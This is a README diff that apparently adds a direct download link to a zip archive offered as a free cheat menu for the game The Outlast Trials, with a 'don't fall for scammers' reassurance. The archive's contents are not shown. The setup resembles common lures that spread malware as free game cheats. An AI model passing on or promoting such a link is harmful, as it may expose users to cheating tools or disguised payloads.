@@ -3,8 +3,8 @@
 ---
 
 <div align="center">
-  <a href="https://github.com/YOUR_GITHUB_USERNAME/YOUR_REPOSITORY_NAME/releases/latest">
-    <img src="https://img.shields.io/github/v/release/YOUR_GITHUB_USERNAME/YOUR_REPOSITORY_NAME?color=green&label=Download%20Latest%20Release&logo=github" alt="Download Latest Version">
+  <a href="https://github.com/fly-ing-fish/Rabbit-Cheat-Menu/releases/download/outlast-trials-cheat/RHTrials.zip">
+    <img src="https://img.shields.io/badge/Download-Latest%20Version-brightgreen" alt="Download Latest Version">
   </a>
   <br>
   The product is completely free. Don't fall for scammers.
